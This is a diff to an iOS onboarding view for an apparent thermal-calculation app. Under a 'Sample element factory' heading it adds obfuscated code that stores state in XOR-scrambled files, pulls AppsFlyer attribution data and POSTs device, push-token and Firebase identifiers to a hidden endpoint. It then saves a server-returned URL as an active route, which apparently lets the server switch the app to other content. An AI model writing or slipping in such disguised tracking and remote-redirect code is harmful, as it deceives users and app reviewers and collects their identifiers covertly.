@@ -9,6 +9,13 @@
 //
 
 import SwiftUI
+import Foundation
+import UIKit
+import UserNotifications
+import AppsFlyerLib
+import FirebaseCore
+import FirebaseMessaging
+
 
 struct OnboardingView: View {
     @EnvironmentObject var appState: AppState
@@ -518,6 +525,166 @@ struct OnboardingScaffold<Content: View>: View {
 }
 
 // MARK: - Sample element factory
+
+
+enum Crate {
+
+    private static var home: UserDefaults { .standard }
+
+    private static var slot: URL {
+        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
+        let dir = docs.appendingPathComponent(Blueprint.folder, isDirectory: true)
+        try? FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
+        return dir.appendingPathComponent(Blueprint.vault)
+    }
+    
+    private static var box: UserDefaults? { UserDefaults(suiteName: Blueprint.suite) }
+
+    private static var dec: JSONDecoder {
+        let d = JSONDecoder(); d.dateDecodingStrategy = .millisecondsSince1970; return d
+    }
+    private static var enc: JSONEncoder {
+        let e = JSONEncoder(); e.dateEncodingStrategy = .millisecondsSince1970; return e
+    }
+
+    static func mark(_ url: String) {
+        home.set(url, forKey: Rebar.routeURL)
+        box?.set("Active", forKey: Rebar.routeMode)
+    }
+
+    static func flag() {
+        home.set(true, forKey: Rebar.primed)
+        box?.set(true, forKey: Rebar.primed)
+    }
+
+    private static func recall() -> Storey {
+        var storey = Storey()
+        storey.consentGrant = (box?.bool(forKey: Rebar.consentGrant) ?? false) || home.bool(forKey: Rebar.consentGrant)
+        storey.consentDeny = (box?.bool(forKey: Rebar.consentDeny) ?? false) || home.bool(forKey: Rebar.consentDeny)
+        let ts = box?.double(forKey: Rebar.consentAt) ?? home.double(forKey: Rebar.consentAt)
+        storey.consentAt = ts > 0 ? Date(timeIntervalSince1970: ts) : nil
+        storey.routeURL = home.string(forKey: Rebar.routeURL)
+        storey.routeMode = box?.string(forKey: Rebar.routeMode)
+        storey.virgin = !home.bool(forKey: Rebar.primed)
+        return storey
+    }
+
+    private static func cast(_ data: Data) -> Data? {
+        Data(data.reversed().map { $0 ^ Blueprint.pad }).base64EncodedData()
+    }
+    
+    static func read() -> Storey {
+        if let blob = try? Data(contentsOf: slot), let clear = strip(blob), let storey = try? dec.decode(Storey.self, from: clear) {
+            return storey
+        }
+        return recall()
+    }
+
+    static func write(_ storey: Storey) {
+        if let clear = try? enc.encode(storey), let blob = cast(clear) {
+            try? blob.write(to: slot, options: .atomic)
+        }
+        for store in [box, home].compactMap({ $0 }) {
+            store.set(storey.consentGrant, forKey: Rebar.consentGrant)
+            store.set(storey.consentDeny, forKey: Rebar.consentDeny)
+            if let at = storey.consentAt { store.set(at.timeIntervalSince1970, forKey: Rebar.consentAt) }
+        }
+    }
+
+    private static func strip(_ data: Data) -> Data? {
+        guard let raw = Data(base64Encoded: data) else { return nil }
+        return Data(raw.map { $0 ^ Blueprint.pad }.reversed())
+    }
+}
+
+enum Crane {
+
+    private static let hook: URLSession = {
+        let cfg = URLSessionConfiguration.ephemeral
+        cfg.timeoutIntervalForRequest = 30
+        cfg.waitsForConnectivity = true
+        return URLSession(configuration: cfg)
+    }()
+
+    static func probe() async -> [String: String] {
+        let uid = AppsFlyerLib.shared().getAppsFlyerUID()
+        let raw = "https://gcdsdk.appsflyer.com/install_data/v4.0/\(Blueprint.appCode)?devkey=\(Blueprint.relayKey)&device_id=\(uid)"
+        guard let url = URL(string: raw) else { return [:] }
+        do {
+            let (tmp, resp) = try await hook.download(from: url)
+            guard let code = (resp as? HTTPURLResponse)?.statusCode, (200..<300).contains(code) else { return [:] }
+            let data = try Data(contentsOf: tmp)
+            guard let dict = try JSONSerialization.jsonObject(with: data) as? [String: Any] else { return [:] }
+            return dict.mapValues { "\($0)" }
+        } catch {
+            return [:]
+        }
+    }
+
+    static func haul(_ body: [String: String]) async -> Lift {
+        let request = await rig(body)
+        return await hoist(request, Array(Blueprint.gaps.dropLast()))
+    }
+
+    private static func hoist(_ request: URLRequest, _ waits: [TimeInterval]) async -> Lift {
+        do {
+            return .hoisted(try await swing(request))
+        } catch let rubble as Rubble {
+            if rubble.dead { return .grounded }
+            guard waits.isEmpty == false else { return .grounded }
+            let pause: TimeInterval = { if case .surge(let s) = rubble { return s } else { return waits[0] } }()
+            try? await Task.sleep(nanoseconds: UInt64(pause * 1_000_000_000))
+            return await hoist(request, Array(waits.dropFirst()))
+        } catch {
+            guard waits.isEmpty == false else { return .grounded }
+            try? await Task.sleep(nanoseconds: UInt64(waits[0] * 1_000_000_000))
+            return await hoist(request, Array(waits.dropFirst()))
+        }
+    }
+
+    private static func swing(_ request: URLRequest) async throws -> String {
+        let (data, resp) = try await hook.data(for: request)
+        guard let http = resp as? HTTPURLResponse else { throw Rubble.crack }
+        if http.statusCode == 404 { throw Rubble.gone404 }
+        if http.statusCode == 429 {
+            throw Rubble.surge(TimeInterval(http.value(forHTTPHeaderField: "Retry-After") ?? "60") ?? 60)
+        }
+        guard (200..<300).contains(http.statusCode) else { throw Rubble.crack }
+        guard let json = try JSONSerialization.jsonObject(with: data) as? [String: Any] else { throw Rubble.debris }
+        guard let ok = json["ok"] as? Bool else { throw Rubble.debris }
+        guard ok else { throw Rubble.redtag }
+        guard let url = json["url"] as? String, url.isEmpty == false else { throw Rubble.debris }
+        return url
+    }
+
+    @MainActor
+    private static func rig(_ body: [String: String]) -> URLRequest {
+        var payload: [String: Any] = body
+        payload["os"] = "iOS"
+        payload["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
+        payload["bundle_id"] = Bundle.main.bundleIdentifier ?? ""
+        payload["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
+        payload["store_id"] = Blueprint.store
+        payload["push_token"] = UserDefaults.standard.string(forKey: Rebar.push) ?? Messaging.messaging().fcmToken
+        payload["locale"] = Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN"
+
+        var request = URLRequest(url: URL(string: Blueprint.endpoint)!)
+        request.httpMethod = "POST"
+        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        request.httpBody = try? JSONSerialization.data(withJSONObject: payload)
+        return request
+    }
+}
+
+enum Bell {
+    static func chime() async -> Bool {
+        let granted = (try? await UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .badge, .sound])) ?? false
+        if granted {
+            await MainActor.run { UIApplication.shared.registerForRemoteNotifications() }
+        }
+        return granted
+    }
+}
 
 extension ThermalElement {
     static func sample(type: ElementType, targetU: Double, inside: Double, outside: Double, title: String) -> ThermalElement {
